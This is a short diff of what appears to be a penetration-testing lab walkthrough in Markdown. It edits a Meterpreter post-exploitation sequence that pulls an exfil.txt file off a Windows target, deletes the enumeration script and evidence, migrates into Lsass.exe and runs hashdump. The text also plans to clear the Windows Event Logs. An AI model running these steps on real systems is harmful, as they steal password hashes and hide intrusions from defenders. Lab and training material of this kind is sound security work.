@@ -173,16 +173,14 @@ exit
 download exfil.txt  
 rm jaws-enum.ps1 
 rm exfil.txt
-run post/windows/manage/migrate
 ```
 
-The last command uses meterpreter to migrate you to a new notepad.exe process.  
-
 Next we will look for the pid of the Lsass.exe process and migrate to that.  
-If the pid you see if different use the one you see.
+If the pid you see when you run `ps` if different use the one you see.
 Assuming that works we shoudl be able finish by performing a hashdump and clear the Windows Event Logs.  
 
 ```
+run post/windows/manage/migrate
 ps  
 migrate 592
 hashdump
